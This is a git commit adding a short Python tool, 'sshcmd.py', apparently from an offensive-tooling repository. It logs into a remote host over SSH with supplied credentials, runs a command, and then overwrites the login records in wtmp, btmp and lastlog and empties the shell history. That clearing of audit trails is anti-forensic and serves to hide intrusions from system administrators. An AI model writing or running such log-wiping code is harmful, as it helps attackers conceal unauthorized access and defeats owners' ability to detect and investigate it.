22019586c639396ee3de7f237c980e0ac2035e03
k8gege <42312878+k8gege@users.noreply.github.com>
2019-06-08 18:18:29 +0800

    Add files via upload

---
+++ sshcmd.py
@@ -0,0 +1,14 @@
+import paramiko
+import sys
+print("sshcmd 1.0")
+print("by k8gege")
+ssh = paramiko.SSHClient()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+ssh.connect(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
+stdin, stdout, stderr = ssh.exec_command(sys.argv[5])
+print stdout.read()
+ssh.exec_command('echo > /var/log/wtmp')
+ssh.exec_command('echo > /var/log/btmp')
+ssh.exec_command('echo > /var/log/lastlog')
+ssh.exec_command('echo "">.bash_history')
+ssh.close()
